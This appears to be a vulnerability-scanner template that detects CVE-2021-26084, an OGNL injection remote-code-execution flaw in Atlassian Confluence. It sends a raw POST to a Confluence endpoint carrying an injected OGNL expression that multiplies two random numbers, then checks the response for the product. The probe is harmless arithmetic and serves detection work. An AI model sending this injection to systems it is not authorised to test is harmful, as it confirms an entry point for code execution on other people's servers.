id: CVE-2021-26084
info:
  name: Atlassian Confluence RCE (CVE-2021-26084)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code. The vulnerable endpoints can be accessed if 'Allow people to sign up to create their account' is enabled.
  tags: rce, ognl, confluence
  reference:
    - https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

variables:
  rand1: '{{rand_int(1000, 2000)}}'
  rand2: '{{rand_int(1000, 2000)}}'
  result: '{{to_number(rand1)*to_number(rand2)}}'

http:
  - raw:
      - |
        POST /pages/createpage-entervariables.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        queryString=aaaa%27%2b%23{{rand1}}*{{rand2}}%2b%27bbb
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "aaaa"
          - "{{result}}"
      - type: status
        status:
          - 200
